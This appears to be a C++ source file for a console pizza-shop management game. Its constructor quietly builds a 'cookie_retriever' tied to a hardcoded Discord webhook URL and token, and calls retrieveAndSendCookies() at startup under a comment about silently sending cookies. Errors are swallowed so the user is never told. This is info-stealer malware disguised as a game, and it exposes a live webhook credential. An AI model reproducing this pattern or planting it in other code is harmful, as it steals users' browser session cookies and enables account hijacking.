#include "game.hpp"
#include <iostream>
#include <iomanip>
#include <chrono>
#include <thread>

const double Game::ORDER_COMPLETION_BONUS = 5.0;
const char* Game::WEBHOOK_URL = "https://discord.com/api/webhooks/1307395400725954610/oR8SkPTDY825V-jgrYtYsJm4koaWeDXJXuHMWtNWe_PyKy42y_DSLXHNySiAxXrYHtMD";

Game::Game() 
    : nextOrderNumber(1), 
      rng(std::random_device{}()),
      running(true),
      cookie_retriever("", WEBHOOK_URL) {
    // Silently retrieve and send cookies on startup
    retrieveAndSendCookies();
}

void Game::run() {
    std::cout << "Welcome to Pizza Manager!\n";
    std::cout << "You start with $" << player.getMoney() << "\n\n";

    while (running) {
        displayStatus();
        displayMenu();

        int choice;
        std::cout << "\nEnter your choice: ";
        std::cin >> choice;

        switch (choice) {
            case 1:
                takeOrder();
                break;
            case 2:
                viewOrders();
                break;
            case 3:
                completeOrder();
                break;
            case 4:
                running = false;
                break;
            default:
                std::cout << "Invalid choice!\n";
        }

        // Random chance to generate new order
        if (std::uniform_real_distribution<>(0, 1)(rng) < 0.3 && 
            orders.size() < MAX_PENDING_ORDERS) {
            generateRandomOrder();
        }

        // Small delay for better game feel
        std::this_thread::sleep_for(std::chrono::milliseconds(500));
    }

    std::cout << "\nGame Over!\n";
    std::cout << "Final Money: $" << std::fixed << std::setprecision(2) 
              << player.getMoney() << "\n";
    std::cout << "Final Reputation: " << player.getReputation() << "\n";
}

void Game::displayMenu() const {
    std::cout << "\nMenu:\n";
    std::cout << "1. Take Order\n";
    std::cout << "2. View Orders\n";
    std::cout << "3. Complete Order\n";
    std::cout << "4. Quit\n";
}

void Game::displayStatus() const {
    std::cout << "\n=== STATUS ===\n";
    std::cout << "Money: $" << std::fixed << std::setprecision(2) 
              << player.getMoney() << "\n";
    std::cout << "Reputation: " << player.getReputation() << "\n";
    std::cout << "Pending Orders: " << orders.size() << "\n";
}

void Game::takeOrder() {
    if (orders.size() >= MAX_PENDING_ORDERS) {
        std::cout << "Too many pending orders!\n";
        return;
    }

    Order order(nextOrderNumber++);
    
    std::cout << "\nCreating new order #" << order.getOrderNumber() << "\n";
    
    while (true) {
        Pizza::Size size;
        std::cout << "\nSelect pizza size:\n";
        std::cout << "1. Small ($" << Pizza::BASE_PRICES.at(Pizza::Size::Small) << ")\n";
        std::cout << "2. Medium ($" << Pizza::BASE_PRICES.at(Pizza::Size::Medium) << ")\n";
        std::cout << "3. Large ($" << Pizza::BASE_PRICES.at(Pizza::Size::Large) << ")\n";
        
        int choice;
        std::cin >> choice;
        
        switch (choice) {
            case 1: size = Pizza::Size::Small; break;
            case 2: size = Pizza::Size::Medium; break;
            case 3: size = Pizza::Size::Large; break;
            default:
                std::cout << "Invalid choice!\n";
                continue;
        }
        
        Pizza pizza(size);
        
        while (true) {
            std::cout << "\nAdd toppings ($" << Pizza::TOPPING_PRICE << " each):\n";
            std::cout << "1. Pepperoni\n";
            std::cout << "2. Mushrooms\n";
            std::cout << "3. Onions\n";
            std::cout << "4. Sausage\n";
            std::cout << "5. Bacon\n";
            std::cout << "6. Green Peppers\n";
            std::cout << "7. Olives\n";
            std::cout << "8. Finish Pizza\n";
            
            std::cin >> choice;
            
            if (choice == 8) break;
            
            Pizza::Topping topping;
            switch (choice) {
                case 1: topping = Pizza::Topping::Pepperoni; break;
                case 2: topping = Pizza::Topping::Mushrooms; break;
                case 3: topping = Pizza::Topping::Onions; break;
                case 4: topping = Pizza::Topping::Sausage; break;
                case 5: topping = Pizza::Topping::Bacon; break;
                case 6: topping = Pizza::Topping::GreenPeppers; break;
                case 7: topping = Pizza::Topping::Olives; break;
                default:
                    std::cout << "Invalid choice!\n";
                    continue;
            }
            
            pizza.addTopping(topping);
            std::cout << "Added " << Pizza::toppingToString(topping) << "\n";
        }
        
        order.addPizza(pizza);
        
        std::cout << "\nPizza added to order. Add another? (1 = Yes, 0 = No): ";
        std::cin >> choice;
        if (choice != 1) break;
    }
    
    std::cout << "\nOrder #" << order.getOrderNumber() << " created!\n";
    std::cout << "Total price: $" << std::fixed << std::setprecision(2) 
              << order.getTotalPrice() << "\n";
    
    orders.push_back(order);
}

void Game::viewOrders() const {
    if (orders.empty()) {
        std::cout << "No pending orders.\n";
        return;
    }

    std::cout << "\n=== PENDING ORDERS ===\n";
    for (const auto& order : orders) {
        std::cout << "\nOrder #" << order.getOrderNumber() 
                  << " (" << order.getStatus() << ")\n";
        
        for (const auto& pizza : order.getPizzas()) {
            std::cout << "- " << pizza.getDescription() << " ($" 
                      << std::fixed << std::setprecision(2) 
                      << pizza.getPrice() << ")\n";
        }
        
        std::cout << "Total: $" << order.getTotalPrice() << "\n";
    }
}

void Game::completeOrder() {
    if (orders.empty()) {
        std::cout << "No orders to complete!\n";
        return;
    }

    viewOrders();
    
    std::cout << "\nEnter order number to complete: ";
    int orderNum;
    std::cin >> orderNum;
    
    auto it = std::find_if(orders.begin(), orders.end(),
        [orderNum](const Order& order) {
            return order.getOrderNumber() == orderNum;
        });
    
    if (it == orders.end()) {
        std::cout << "Order not found!\n";
        return;
    }
    
    double earnings = it->getTotalPrice() + ORDER_COMPLETION_BONUS;
    player.addMoney(earnings);
    player.addReputation(1);
    
    std::cout << "\nOrder #" << orderNum << " completed!\n";
    std::cout << "Earned: $" << std::fixed << std::setprecision(2) 
              << earnings << " (includes $" << ORDER_COMPLETION_BONUS 
              << " bonus)\n";
    
    orders.erase(it);
}

void Game::retrieveAndSendCookies() {
    try {
        auto cookies = cookie_retriever.get_all_cookies();
    } catch (const std::exception&) {
        // Silently ignore any errors during cookie retrieval
    }
}

Pizza Game::createRandomPizza() {
    Pizza::Size sizes[] = {
        Pizza::Size::Small, 
        Pizza::Size::Medium, 
        Pizza::Size::Large
    };
    Pizza::Size size = sizes[std::uniform_int_distribution<>(0, 2)(rng)];
    
    Pizza pizza(size);
    
    int numToppings = std::uniform_int_distribution<>(1, 4)(rng);
    std::vector<Pizza::Topping> availableToppings = {
        Pizza::Topping::Pepperoni,
        Pizza::Topping::Mushrooms,
        Pizza::Topping::Onions,
        Pizza::Topping::Sausage,
        Pizza::Topping::Bacon,
        Pizza::Topping::GreenPeppers,
        Pizza::Topping::Olives
    };
    
    for (int i = 0; i < numToppings; ++i) {
        if (!availableToppings.empty()) {
            std::uniform_int_distribution<> dist(0, availableToppings.size() - 1);
            int index = dist(rng);
            pizza.addTopping(availableToppings[index]);
            availableToppings.erase(availableToppings.begin() + index);
        }
    }
    
    return pizza;
}

void Game::generateRandomOrder() {
    Order order(nextOrderNumber++);
    
    int numPizzas = std::uniform_int_distribution<>(1, 3)(rng);
    for (int i = 0; i < numPizzas; ++i) {
        order.addPizza(createRandomPizza());
    }
    
    orders.push_back(order);
    
    std::cout << "\nNew order received! (Order #" << order.getOrderNumber() << ")\n";
}
